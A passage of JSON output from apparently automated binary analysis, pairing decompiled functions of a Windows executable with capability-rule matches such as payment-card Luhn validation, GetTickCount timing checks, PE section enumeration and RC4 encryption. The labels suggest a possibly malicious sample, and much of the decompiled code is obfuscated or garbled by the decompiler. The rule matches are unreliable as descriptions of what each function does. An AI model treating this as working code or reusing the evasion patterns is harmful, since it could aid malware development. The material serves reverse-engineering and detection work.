        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00452465(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00450bc8(0x45ce20, 0xc);\n    fcn.004548ce(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4624e8;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4624e4;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004524a9;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0044f564(arg_8h_00);\ncode_r0x004524a9:\n        fcn.0044f564(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004524cc();\n    fcn.00450c0d();\n    return;\n}\n",
        "token_count": 397
    },
    "004528ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004528ac(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = 1000;\n    do {\n        func_0x0066b111(in_EAX, uVar1);\n        in_EAX = func_0x004ccfe6();\n        uVar1 = uVar1 + 1000;\n        if (60000 < uVar1) {\n            return;\n        }\n    } while (in_EAX == 0);\n    return;\n}\n",
        "token_count": 121
    },
    "004532cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004532df)\n// WARNING: Removing unreachable block (ram,0x004532e5)\n// WARNING: Removing unreachable block (ram,0x004532e7)\n\nvoid fcn.004532cb(void)\n\n{\n    return;\n}\n",
        "token_count": 62
    },
    "00456c27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456c27(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_8h < 0x14) {\n        fcn.004548ce(arg_8h + 0x10);\n        *(arg_ch + 0xc) = *(arg_ch + 0xc) | 0x8000;\n        return;\n    }\n    fcn.006b2296(arg_ch + 0x20, arg_ch + 0x20);\n    return;\n}\n",
        "token_count": 115
    },
    "00456c95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456c95(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_8h < 0x14) {\n        *(arg_ch + 0xc) = *(arg_ch + 0xc) & 0xffff7fff;\n        fcn.004547f4(arg_8h + 0x10);\n        return;\n    }\n    fcn.00507543(arg_ch + 0x20);\n    return;\n}\n",
        "token_count": 107
    },
    "0044f17f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044f17f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00454518(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "004ac676": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nfloat10 fcn.004ac676(void)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    int32_t in_FS_OFFSET;\n    float10 fVar8;\n    uint32_t uVar7;\n    \n    fVar8 = fcn.0044cb74();\n    uVar6 = *(unaff_EBX + 0x25dd118) + 0x83;\n    uVar7 = uVar6 | 0xd83d7f00;\n    uVar5 = (unaff_EBX + 1U & 0xffffff00 | -(unaff_EBX + 1U < *(unaff_EDI + -4))) ^ 0x84fdb0c4;\n    uVar5 = uVar5 & 0xffffff00 | uVar5 + *(unaff_ESI + -0x80);\n    iVar4 = *(uVar5 + 2);\n    puVar2 = uVar5 + 0xf45f0243;\n    if (*puVar2 <= *0xc2fafdbd) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar3 = in_FS_OFFSET + uVar7;\n    uVar5 = *puVar3;\n    *puVar3 = uVar5 << 9 | CONCAT14(*0xc2fafdbd < *puVar2, uVar5) >> 0x18;\n    pcVar1 = uVar7 + 0x66;\n    *pcVar1 = *pcVar1 + uVar6;\n    return fVar8 + iVar4;\n}\n",
        "token_count": 420
    },
    "00510320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00510320(uint param_1, uint16_t param_2, int32_t param_3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    \n    uVar2 = ((param_3 + 0x50aa4134) * 2 | param_3 + 0x50aa4134 < 0) - 1;\n    iVar1 = 0xf;\n    if (*0x10 - 0x24U != 0) {\n        for (; *0x10 - 0x24U >> iVar1 == 0; iVar1 = iVar1 + -1) {\n        }\n    }\n    puVar3 = (uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 * 0x1000000) + 0xc6629f61;\n    iVar1 = 0;\n    if (param_2 != 0) {\n        for (; (param_2 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n        }\n    }\n    uVar2 = (~(*puVar3 ^ puVar3) ^ 0x257e7593) - 1;\n    // WARNING: Could not recover jumptable at 0x004ffdea. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*((uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 * 0x1000000) + 0x5103c9))();\n    return;\n}\n",
        "token_count": 395
    },
    "005d240b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.005d240b(void)\n\n{\n    int32_t extraout_ECX;\n    uint32_t uVar1;\n    int32_t unaff_EDI;\n    \n    fcn.00634fd4(0xd11386b2);\n    uVar1 = (extraout_ECX << 1 | extraout_ECX < 0) - 1;\n    // WARNING: Could not recover jumptable at 0x0051c02d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*(unaff_EDI + (uVar1 * 4 | uVar1 >> 0x1e)))();\n    return;\n}\n",
        "token_count": 146
    },
    "005e8eda": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.005e8eda(void)\n\n{\n    fcn.00634fd4(0xd12f78a4);\n    return;\n}\n",
        "token_count": 33
    },
    "00634fd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00634fd4(uint32_t param_1)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = ~((param_1 >> 1 | ((param_1 & 1) != 0) << 0x1f) + 0x9718fb4c);\n    iVar1 = 0;\n    if (*0x10 - 0x24U != 0) {\n        for (; (*0x10 - 0x24U >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n        }\n    }\n    uVar2 = (*(uVar2 - 5) ^ uVar2 - 1) + 1;\n    uVar2 = (uVar2 >> 1 | ((uVar2 & 1) != 0) << 0x1f) + 0xfb95b073;\n    // WARNING: Could not recover jumptable at 0x0068e3eb. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*((uVar2 >> 3 | uVar2 * 0x20000000) + 0x6696cb))();\n    return;\n}\n",
        "token_count": 271
    },
    "00657890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00657890(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "0067ea0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0067ea0a(void)\n\n{\n    return;\n}\n",
        "token_count": 17
    },
    "006a5b2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.006a5b2d(void)\n\n{\n    return;\n}\n",
        "token_count": 18
    },
    "006e666d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.006e666d(void)\n\n{\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    fcn.00634fd4(0xd11386b2);\n    uVar1 = fcn.006a5b2d(0x1ea96fb3);\n    // WARNING: Could not recover jumptable at 0x004b0eb9. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*(unaff_ESI + (uVar1 ^ 0x2f386524) + 0x82c6b5af))();\n    return;\n}\n",
        "token_count": 140
    },
    "007f65b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.007f65b5(void)\n\n{\n    return;\n}\n",
        "token_count": 17
    },
    "008d8197": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.008d8197(uint param_1, uint16_t param_2, int32_t param_3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    \n    uVar2 = ((param_3 + 0x50aa4134) * 2 | param_3 + 0x50aa4134 < 0) - 1;\n    iVar1 = 0xf;\n    if (*0x10 - 0x24U != 0) {\n        for (; *0x10 - 0x24U >> iVar1 == 0; iVar1 = iVar1 + -1) {\n        }\n    }\n    puVar3 = (uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 * 0x1000000) + 0xc6629f61;\n    iVar1 = 0;\n    if (param_2 != 0) {\n        for (; (param_2 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n        }\n    }\n    uVar2 = (~(*puVar3 ^ puVar3) ^ 0x257e7593) - 1;\n    // WARNING: Could not recover jumptable at 0x0089de8b. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*((uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 * 0x1000000) + 0x8d8240))();\n    return;\n}\n",
        "token_count": 398
    },
    "004034f0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004034f0(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x14) = param_2;\n    if (0xf < *(param_1 + 0x18)) {\n        *(*(param_1 + 4) + param_2) = 0;\n        return;\n    }\n    *(param_1 + 4 + param_2) = 0;\n    return;\n}\n",
        "token_count": 105
    },
    "00403ed0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00403ed0(int32_t param_1, uint param_2)\n\n{\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4) = 0;\n    fcn.00403cd0(param_2, 0, 0xffffffff);\n    return param_1;\n}\n",
        "token_count": 97
    },
    "004040b0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004040b0(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00403db0(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 162
    },
    "00407b43": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407b43(uint arg_8h)\n\n{\n    uchar uVar1;\n    uint *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004122ae(0xc);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *extraout_ECX = vtable.AFX_MODULE_STATE.0;\n    extraout_ECX[7] = NULL;\n    extraout_ECX[8] = NULL;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[10] = NULL;\n    fcn.00403540();\n    extraout_ECX[0x10] = NULL;\n    extraout_ECX[0x11] = NULL;\n    extraout_ECX[0x14] = 0xffffffff;\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x1a] = NULL;\n    extraout_ECX[0x1b] = NULL;\n    uVar1 = *(unaff_EBP + 8);\n    extraout_ECX[10] = 0x20;\n    extraout_ECX[8] = 0x14;\n    extraout_ECX[6] = NULL;\n    *(extraout_ECX + 5) = uVar1;\n    *(unaff_EBP + -4) = 2;\n    fcn.00403590(0x1000);\n    *(unaff_EBP + -4) = 1;\n    extraout_ECX[0xc] = 0x1;\n    extraout_ECX[0x11] = 0x18;\n    pcVar3 = fcn.00405ac3(0xc);\n    extraout_ECX[0x1e] = pcVar3;\n    iVar4 = fcn.004080d9(0x188);\n    *(unaff_EBP + 8) = iVar4;\n    *(unaff_EBP + -4) = 4;\n    if (iVar4 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.00407855();\n    }\n    puVar2 = extraout_ECX[0x1e];\n    *(unaff_EBP + -4) = 1;\n    *puVar2 = uVar5;\n    iVar4 = fcn.004080d9(100);\n    *(unaff_EBP + 8) = iVar4;\n    *(unaff_EBP + -4) = 5;\n    if (iVar4 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.00407a79();\n    }\n    pcVar3 = extraout_ECX[0x1e];\n    *(unaff_EBP + -4) = 1;\n    *(pcVar3 + 4) = uVar5;\n    iVar4 = fcn.004080d9(0x14);\n    *(unaff_EBP + 8) = iVar4;\n    *(unaff_EBP + -4) = 6;\n    if (iVar4 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.00407afc();\n    }\n    *(extraout_ECX[0x1e] + 8) = uVar5;\n    extraout_ECX[0x1f] = 0x1;\n    extraout_ECX[0x20] = NULL;\n    extraout_ECX[0x21] = NULL;\n    extraout_ECX[0x22] = NULL;\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 877
    },
    "00409eb6": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409eb6(code *arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.CMapPtrToPtr.0;\n    if (arg_8h < 1) {\n        arg_8h = 0xa;\n    }\n    in_ECX[1] = NULL;\n    in_ECX[2] = 0x11;\n    in_ECX[3] = NULL;\n    in_ECX[4] = NULL;\n    in_ECX[5] = NULL;\n    in_ECX[6] = arg_8h;\n    return;\n}\n",
        "token_count": 137
    },
    "0040ab16": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ab16(code **param_1)\n\n{\n    *param_1 = vtable.CCmdUI.0;\n    param_1[8] = NULL;\n    param_1[2] = NULL;\n    param_1[1] = NULL;\n    param_1[9] = NULL;\n    param_1[4] = NULL;\n    param_1[3] = NULL;\n    param_1[5] = NULL;\n    param_1[7] = NULL;\n    param_1[6] = NULL;\n    return;\n}\n",
        "token_count": 126
    },
    "0040ab8a": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040ab8a(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00407ce3();\n    *(param_1 + 0x1c) = uVar1;\n    *(param_1 + 4) = 1;\n    *(param_1 + 0x14) = 1;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x18) = 0;\n    return param_1;\n}\n",
        "token_count": 151
    },
    "0040aeee": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040aeee(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t arg_ch_00;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    pcVar1 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CHandleMap.0;\n    fcn.004107eb(*(pcVar1 + 4), 0x40);\n    *(unaff_EBP + -4) = 0;\n    fcn.00409eb6(10);\n    *(unaff_EBP + -4) = 1;\n    fcn.00409eb6(4);\n    arg_ch_00 = 0;\n    *(unaff_EBP + -4) = 2;\n    if (*(unaff_EBP + 0xc) != 0) goto code_r0x0040af43;\n    do {\n        arg_ch_00 = fcn.00405f96();\ncode_r0x0040af43:\n    } while (*(unaff_EBP + 0x10) == arg_ch_00);\n    fcn.00409c99(7, arg_ch_00);\n    extraout_ECX[5] = *(unaff_EBP + 0xc);\n    extraout_ECX[6] = *(unaff_EBP + 0x10);\n    extraout_ECX[0x16] = *(unaff_EBP + 0x14);\n    extraout_ECX[0x17] = *(unaff_EBP + 0x18);\n    extraout_ECX[0x15] = pcVar1;\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 469
    },
    "00429136": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429136(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    *(param_1 + 0x24) = 0;\n    *(param_1 + 4) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0x201;\n    *(param_1 + 0x14) = 6;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    fcn.004041a0(0, 0);\n    iVar1 = fcn.00405ac3(4);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.00427ddf();\n    }\n    *(param_1 + 0x24) = uVar2;\n    return;\n}\n",
        "token_count": 237
    },
    "004069f3": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004069f3(uint16_t *arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*arg_8h < 0x76c) {\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    else {\n        fcn.0040695e(*arg_8h, arg_8h[1], arg_8h[3], arg_8h[4], arg_8h[5], arg_8h[6], arg_ch);\n        *in_ECX = in_ECX;\n        in_ECX[1] = in_ECX;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "004097bc": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004097bc(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_8h_00;\n    uint *in_ECX;\n    \n    uVar1 = fcn.00583601(&stack0xfffffffc, *in_ECX);\n    arg_8h_00 = *(in_ECX + 2);\n    fcn.004088f0(arg_8h_00);\n    fcn.004088f0(arg_8h_00);\n    fcn.00409690(*in_ECX, uVar1 & 0xffff);\n    return;\n}\n",
        "token_count": 136
    },
    "0041384d": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041384d(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t unaff_ESI;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar1 = *(param_1 + -0x15);\n    if ((unaff_ESI == uVar1) || (iVar3 = (unaff_ESI != uVar1 && -1 < unaff_ESI - uVar1) * 2 + -1,  iVar3 == 0)) {\n        uVar2 = *(in_EAX + -0x14);\n        uVar1 = *(param_1 + -0x14);\n        if ((uVar2 == uVar1) || (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 == 0)) {\n            uVar2 = *(in_EAX + -0x13);\n            uVar1 = *(param_1 + -0x13);\n            if ((uVar2 == uVar1) || (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 == 0)) {\n                iVar3 = *(in_EAX + -0x12) - *(param_1 + -0x12);\n                if (iVar3 != 0) {\n                    iVar3 = (0 < iVar3) * 2 + -1;\n                }\n                if (iVar3 == 0) {\n                    if (*(in_EAX + -0x11) == *(param_1 + -0x11)) {\n                        iVar3 = 0;\n                    }\n                    else {\n                        uVar2 = *(in_EAX + -0x11) & 0xff;\n                        uVar1 = *(param_1 + -0x11);\n                        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0))\n                        {\n                            return iVar3;\n                        }\n                        uVar2 = *(in_EAX + -0x10);\n                        uVar1 = *(param_1 + -0x10);\n                        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0))\n                        {\n                            return iVar3;\n                        }\n                        uVar2 = *(in_EAX + -0xf);\n                        uVar1 = *(param_1 + -0xf);\n                        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0))\n                        {\n                            return iVar3;\n                        }\n                        iVar3 = *(in_EAX + -0xe) - *(param_1 + -0xe);\n                        if (iVar3 != 0) {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                    }\n                    if (iVar3 == 0) {\n                        if (*(in_EAX + -0xd) == *(param_1 + -0xd)) {\n                            iVar3 = 0;\n                        }\n                        else {\n                            uVar2 = *(in_EAX + -0xd) & 0xff;\n                            uVar1 = *(param_1 + -0xd);\n                            if ((uVar2 != uVar1) &&\n                               (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                                return iVar3;\n                            }\n                            uVar2 = *(in_EAX + -0xc);\n                            uVar1 = *(param_1 + -0xc);\n                            if ((uVar2 != uVar1) &&\n                               (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                                return iVar3;\n                            }\n                            uVar2 = *(in_EAX + -0xb);\n                            uVar1 = *(param_1 + -0xb);\n                            if ((uVar2 != uVar1) &&\n                               (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                                return iVar3;\n                            }\n                            iVar3 = *(in_EAX + -10) - *(param_1 + -10);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        if (iVar3 == 0) {\n                            if (*(in_EAX + -9) == *(param_1 + -9)) {\n                                iVar3 = 0;\n                            }\n                            else {\n                                uVar1 = *(param_1 + -9);\n                                uVar2 = *(in_EAX + -9);\n                                if ((uVar2 != uVar1) &&\n                                   (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                                    return iVar3;\n                                }\n                                uVar2 = *(in_EAX + -8);\n                                uVar1 = *(param_1 + -8);\n                                if ((uVar2 != uVar1) &&\n                                   (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                                    return 